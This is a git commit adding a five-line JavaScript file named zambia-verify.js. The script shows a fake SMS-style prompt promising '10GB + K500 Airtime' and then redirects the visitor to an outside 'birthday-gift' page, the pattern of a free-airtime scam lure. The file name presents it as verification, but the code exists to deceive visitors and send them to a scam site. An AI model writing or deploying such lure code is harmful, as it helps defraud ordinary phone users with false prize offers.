5cbbf55d845393c41cf01007d525c9cc038c8ffd
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-05-06 23:15:41 -0700

    Create zambia-verify.js

---
+++ zambia-verify.js
@@ -0,0 +1,5 @@
+var password = '10GB + K500 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB + K500 Airtime, click OK to Activate now','10GB + K500 Airtime');
+if (password != '10GB + K500 Airtime') {
+location.href='https://ebekpone.com/birthday-gift.html';
+}
